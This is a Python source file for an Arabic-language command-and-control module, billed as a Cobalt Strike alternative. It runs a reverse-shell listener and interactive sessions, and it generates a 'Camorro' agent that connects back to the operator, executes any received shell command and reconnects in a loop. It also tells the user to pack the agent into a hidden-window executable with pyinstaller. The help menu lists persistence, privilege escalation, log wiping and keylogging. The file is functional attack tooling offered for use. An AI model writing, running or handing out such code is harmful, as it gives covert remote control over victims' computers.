#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# C2 Module - بديل Cobalt Strike و Brute Ratel

import os
import socket
import threading
import sys
import time
from colorama import init, Fore, Style
from banner import show_banner

init(autoreset=True)

class C2Module:
    def __init__(self):
        self.name = "C2 Framework"
        self.sessions = {}
        self.listener_running = False
        self.listener_thread = None
    
    def show_menu(self):
        menu = f"""
{Fore.RED}╔══════════════════════════════════════════════╗
║     ☠️  قائمة نظام التحكم (C2)               ║
╠══════════════════════════════════════════════╣
║                                              ║
║  {Fore.WHITE}[1] {Fore.GREEN}تشغيل Listener (Reverse TCP)        {Fore.RED}║
║  {Fore.WHITE}[2] {Fore.GREEN}عرض الجلسات النشطة                  {Fore.RED}║
║  {Fore.WHITE}[3] {Fore.GREEN}التفاعل مع جلسة                     {Fore.RED}║
║  {Fore.WHITE}[4] {Fore.GREEN}إرسال أمر إلى جميع الجلسات          {Fore.RED}║
║  {Fore.WHITE}[5] {Fore.GREEN}توليد Agent (Windows)               {Fore.RED}║
║  {Fore.WHITE}[6] {Fore.GREEN}توليد Agent (Linux)                 {Fore.RED}║
║  {Fore.WHITE}[7] {Fore.GREEN}إيقاف Listener                       {Fore.RED}║
║  {Fore.WHITE}[8] {Fore.GREEN}تقرير الجلسات                       {Fore.RED}║
║                                              ║
║  {Fore.RED}[0] {Fore.RED}العودة للقائمة الرئيسية             {Fore.RED}║
║                                              ║
╚══════════════════════════════════════════════╝{Style.RESET_ALL}
"""
        print(menu)
    
    def handle_client(self, client_socket, addr):
        """معالجة اتصال عميل جديد"""
        print(f"\n{Fore.GREEN}[+] اتصال جديد من {addr[0]}:{addr[1]}{Style.RESET_ALL}")
        
        session_id = len(self.sessions) + 1
        self.sessions[session_id] = {
            'socket': client_socket,
            'address': addr,
            'connected_at': time.strftime('%Y-%m-%d %H:%M:%S'),
            'last_active': time.strftime('%Y-%m-%d %H:%M:%S'),
            'os': 'Unknown',
            'hostname': 'Unknown',
            'user': 'Unknown'
        }
        
        print(f"    {Fore.CYAN}[Session ID: {session_id}]{Style.RESET_ALL}")
        
        try:
            # محاولة الحصول على معلومات النظام
            client_socket.send(b"id\n")
            response = client_socket.recv(4096).decode(errors='replace').strip()
            self.sessions[session_id]['user'] = response
            
            client_socket.send(b"uname -a\n")
            response = client_socket.recv(4096).decode(errors='replace').strip()
            self.sessions[session_id]['os'] = response
            
            client_socket.send(b"hostname\n")
            response = client_socket.recv(4096).decode(errors='replace').strip()
            self.sessions[session_id]['hostname'] = response
            
        except:
            pass
        
        print(f"\n{Fore.GREEN}[+] معلومات الجلسة:{Style.RESET_ALL}")
        print(f"    المستخدم: {self.sessions[session_id]['user']}")
        print(f"    النظام: {self.sessions[session_id]['os'][:80]}")
        print(f"    المضيف: {self.sessions[session_id]['hostname']}")
    
    def start_listener(self, host="0.0.0.0", port=4444):
        """تشغيل Listener"""
        if self.listener_running:
            print(f"{Fore.YELLOW}[!] الـ Listener قيد التشغيل بالفعل{Style.RESET_ALL}")
            return
        
        print(f"\n{Fore.YELLOW}[*] تشغيل Listener على {host}:{port}...{Style.RESET_ALL}")
        
        try:
            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            server.bind((host, port))
            server.listen(5)
            server.settimeout(1)
            
            self.listener_running = True
            print(f"{Fore.GREEN}[✓] Listener قيد التشغيل على {host}:{port}{Style.RESET_ALL}")
            print(f"{Fore.CYAN}[*] في انتظار الاتصالات...{Style.RESET_ALL}")
            
            while self.listener_running:
                try:
                    client, addr = server.accept()
                    self.handle_client(client, addr)
                except socket.timeout:
                    continue
                except Exception as e:
                    if self.listener_running:
                        print(f"{Fore.RED}[!] خطأ: {e}{Style.RESET_ALL}")
            
            server.close()
            
        except Exception as e:
            print(f"{Fore.RED}[!] فشل تشغيل Listener: {e}{Style.RESET_ALL}")
    
    def show_sessions(self):
        """عرض الجلسات النشطة"""
        print(f"\n{Fore.CYAN}╔══════════════════════════════════════════════╗")
        print(f"║          الجلسات النشطة: {len(self.sessions)}                ║")
        print(f"╠══════════════════════════════════════════════╣")
        
        if not self.sessions:
            print(f"║  {Fore.YELLOW}لا توجد جلسات نشطة{Fore.CYAN}                   ║")
        else:
            for sid, session in self.sessions.items():
                print(f"║                                              ║")
                print(f"║  {Fore.GREEN}[{sid}]{Fore.CYAN} {session['hostname']:30s} ║")
                print(f"║      {Fore.WHITE}IP: {session['address'][0]:25s} {Fore.CYAN}║")
                print(f"║      {Fore.WHITE}تاريخ: {session['connected_at']:22s} {Fore.CYAN}║")
        
        print(f"╚══════════════════════════════════════════════╝{Style.RESET_ALL}")
    
    def interact_session(self, session_id):
        """التفاعل مع جلسة"""
        if session_id not in self.sessions:
            print(f"{Fore.RED}[!] الجلسة {session_id} غير موجودة{Style.RESET_ALL}")
            return
        
        session = self.sessions[session_id]
        sock = session['socket']
        
        print(f"\n{Fore.GREEN}[*] جلسة تفاعلية مع {session['address'][0]}:{session['address'][1]}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] اكتب 'exit' للخروج، 'help' للمساعدة{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] اكتب 'background' للعودة مع بقاء الجلسة{Style.RESET_ALL}")
        
        while True:
            try:
                cmd = input(f"\n{Fore.RED}camorro[{session_id}]> {Style.RESET_ALL}").strip()
                
                if cmd.lower() == 'exit':
                    break
                elif cmd.lower() == 'background':
                    print(f"{Fore.GREEN}[+] تم تعليق الجلسة {session_id}{Style.RESET_ALL}")
                    return
                elif cmd.lower() == 'help':
                    print(f"""
    {Fore.CYAN}الأوامر المتاحة:{Style.RESET_ALL}
    {Fore.WHITE}  help             - عرض هذه التعليمات
    exit             - إنهاء الجلسة
    background       - تعليق الجلسة (العودة مع بقاء الاتصال)
    shell <cmd>      - تشغيل أمر
    download <file>  - تحميل ملف من الهدف
    upload <file>    - رفع ملف إلى الهدف
    screenshot       - أخذ لقطة شاشة
    persist          - تثبيت persistence
    escalate         - محاولة رفع الصلاحيات
    clearlogs        - مسح السجلات
    info             - معلومات الجلسة
    socks            - تشغيل SOCKS proxy
    keylog           - تشغيل keylogger
    {Style.RESET_ALL}""")
                elif cmd.lower() == 'info':
                    print(f"""
    {Fore.CYAN}معلومات الجلسة {session_id}:{Style.RESET_ALL}
    {Fore.WHITE}  IP الهدف: {session['address'][0]}
    المنفذ: {session['address'][1]}
    النظام: {session['os'][:80]}
    المضيف: {session['hostname']}
    المستخدم: {session['user']}
    وقت الاتصال: {session['connected_at']}
    آخر نشاط: {session['last_active']}
    {Style.RESET_ALL}""")
                elif cmd:
                    # إرسال الأمر
                    sock.send((cmd + "\n").encode())
                    time.sleep(0.5)
                    
                    # استقبال الرد
                    sock.settimeout(2)
                    try:
                        while True:
                            data = sock.recv(4096)
                            if not data:
                                break
                            print(data.decode(errors='replace'), end='')
                    except socket.timeout:
                        pass
                    
                    session['last_active'] = time.strftime('%Y-%m-%d %H:%M:%S')
                    
            except (socket.error, BrokenPipeError):
                print(f"{Fore.RED}[!] انقطع الاتصال بالجلسة {session_id}{Style.RESET_ALL}")
                del self.sessions[session_id]
                break
    
    def generate_agent_python(self, lhost, lport):
        """توليد Agent بلغة Python"""
        agent_code = f'''#!/usr/bin/env python3
import socket, subprocess, os, sys, platform, time

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("{lhost}", {lport}))
    
    # إرسال معلومات النظام
    s.send(f"[+] Camorro Agent Connected\\n".encode())
    s.send(f"OS: {{platform.system()}} {{platform.release()}}\\n".encode())
    s.send(f"Hostname: {{platform.node()}}\\n".encode())
    s.send(f"User: {{os.getenv('USER', 'unknown')}}\\n".encode())
    s.send(f"Python: {{sys.version}}\\n".encode())
    s.send(f"\\nCamorro> ".encode())
    
    while True:
        try:
            data = s.recv(4096).decode(errors='replace').strip()
            if data.lower() == 'exit':
                break
            if data.lower() == 'background':
                s.send(b"Backgrounding session...\\n")
                break
            if not data:
                break
            
            # تشغيل الأمر
            if data.startswith('cd '):
                try:
                    os.chdir(data[3:].strip())
                    s.send(b"\\n")
                except Exception as e:
                    s.send(f"Error: {{e}}\\n".encode())
            else:
                result = subprocess.run(data, shell=True, capture_output=True, text=True, timeout=30)
                output = result.stdout + result.stderr
                if not output.strip():
                    output = "[+] Command executed successfully\\n"
                s.send(output.encode())
            
            s.send(b"Camorro> ")
            
        except subprocess.TimeoutExpired:
            s.send(b"[!] Timeout\\nCamorro> ")
        except Exception as e:
            s.send(f"[!] Error: {{e}}\\nCamorro> ".encode())
    
    s.close()

if __name__ == "__main__":
    while True:
        try:
            connect()
        except Exception as e:
            time.sleep(5)
            continue
'''
        filename = f"camorro_agent_{lport}.py"
        with open(filename, "w") as f:
            f.write(agent_code)
        
        print(f"{Fore.GREEN}[+] تم توليد Agent: {filename}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] للتشغيل على الجهاز المستهدف: python3 {filename}{Style.RESET_ALL}")
        print(f"\n{Fore.YELLOW}[*] يمكنك تحويله إلى EXE باستخدام:{Style.RESET_ALL}")
        print(f"    pyinstaller --onefile --noconsole {filename}")
    
    def run(self):
        show_banner("c2")
        
        while True:
            self.show_menu()
            choice = input(f"\n{Fore.GREEN}╰➤ {Fore.YELLOW}اختر العملية [0-8]: {Style.RESET_ALL}")
            
            if choice == "0":
                if self.listener_running:
                    self.listener_running = False
                    print(f"{Fore.YELLOW}[*] جاري إيقاف Listener...{Style.RESET_ALL}")
                break
            elif choice == "1":
                host = input(f"{Fore.WHITE}[?] IP الاستماع (اتركه 0.0.0.0): {Style.RESET_ALL}").strip() or "0.0.0.0"
                port = input(f"{Fore.WHITE}[?] المنفذ (4444): {Style.RESET_ALL}").strip() or "4444"
                
                self.listener_thread = threading.Thread(
                    target=self.start_listener,
                    args=(host, int(port)),
                    daemon=True
                )
                self.listener_thread.start()
                
                input(f"\n{Fore.CYAN}[*] Listener يعمل في الخلفية. اضغط Enter للمتابعة...{Style.RESET_ALL}")
            elif choice == "2":
                self.show_sessions()
                input(f"\n{Fore.GREEN}اضغط Enter للمتابعة...{Style.RESET_ALL}")
            elif choice == "3":
                if not self.sessions:
                    print(f"{Fore.YELLOW}[!] لا توجد جلسات نشطة{Style.RESET_ALL}")
                    input(f"\n{Fore.GREEN}اضغط Enter...{Style.RESET_ALL}")
                    continue
                
                self.show_sessions()
                sid = input(f"\n{Fore.WHITE}[?] أدخل رقم الجلسة: {Style.RESET_ALL}").strip()
                if sid.isdigit():
                    self.interact_session(int(sid))
            elif choice == "7":
                if self.listener_running:
                    self.listener_running = False
                    print(f"{Fore.GREEN}[✓] تم إيقاف Listener{Style.RESET_ALL}")
                else:
                    print(f"{Fore.YELLOW}[!] لا يوجد Listener نشط{Style.RESET_ALL}")
                input(f"\n{Fore.GREEN}اضغط Enter...{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}[!] خيار غير صالح{Style.RESET_ALL}")
